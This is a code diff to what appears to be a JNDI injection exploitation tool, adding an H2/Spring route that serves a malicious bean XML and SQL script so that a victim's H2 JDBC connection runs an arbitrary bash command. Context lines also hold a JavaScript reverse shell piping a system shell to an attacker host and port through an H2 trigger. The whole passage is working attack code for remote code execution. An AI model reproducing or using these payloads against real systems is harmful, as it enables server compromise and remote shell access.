@@ -85,7 +85,7 @@ public abstract class DatabaseController implements Controller {
                 "        </constructor-arg>\n" +
                 "    </bean>\n" +
                 "</beans>";
-        WebServer.getInstance().serveFile( "/" + fileName, fileContent.getBytes());
+        WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
         String socketFactoryArg = Config.codebase + fileName;
@@ -162,6 +162,50 @@ public abstract class DatabaseController implements Controller {
 
         String javascript = "//javascript\nvar shell=java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;var p=new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start()\\;var s=new java.net.Socket(\"" + host + "\"," + port + ")\\;var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;var po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;java.lang.Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(e){}}p.destroy()\\;s.close()\\;";
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.h2.Driver");
+        props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/H2/JRE/Spring/Command/{cmd}")
+    public Properties h2JRESpringCommand(String cmd) {
+        System.out.println("[H2-JRE] [Spring] [Command] Cmd: " + cmd);
+
+        String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
+        String xmlContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
+                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
+                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
+                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
+                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
+                "        <constructor-arg>\n" +
+                "        <list>\n" +
+                "            <value>bash</value>\n" +
+                "            <value>-c</value>\n" +
+                "            <value><![CDATA[" + cmd + "]]></value>\n" +
+                "        </list>\n" +
+                "        </constructor-arg>\n" +
+                "    </bean>\n" +
+                "</beans>";
+        WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
+
+        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlContent = "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';\n" +
+                "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
+                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
+                "\n" +
+                "SET @url_str='" + Config.codebase + xmlFileName + "';\n" +
+                "SET @url_obj=UNESCAPE_VALUE(@url_str);\n" +
+                "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');\n" +
+                "SET @string_clazz=CLASS_FOR_NAME('java.lang.String');\n" +
+                "\n" +
+                "CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);";
+        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
+
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
+                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
